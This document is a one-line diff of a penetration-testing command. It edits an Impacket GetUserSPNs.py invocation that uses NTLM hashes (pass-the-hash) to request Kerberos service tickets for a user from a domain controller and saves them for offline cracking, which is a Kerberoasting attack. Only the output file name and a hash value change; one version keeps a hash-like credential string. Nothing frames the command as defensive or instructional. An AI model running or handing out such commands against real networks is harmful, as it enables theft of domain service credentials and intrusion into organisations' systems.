@@ -1,5 +1,5 @@
 
 
-python3 GetUserSPNs.py -request-user UserBob  -outputfile /home/kali/Desktop/hashes/T2_SA_ODXZN_AGT_P004.txt -target-domain pwlb.nom -dc-ip 10.2.2.2 -hashes AAD3B435B51443528d9e58c8cc369caa774f7802016c ABCDglb.com/bhou
+python3 GetUserSPNs.py -request-user UserBob  -outputfile /home/kali/Desktop/hashes/T2-sledge.txt -target-domain pwlb.nom -dc-ip 10.2.2.2 -hashes Aaaxxcc445566gg ABCDglb.com/bhou
 
 
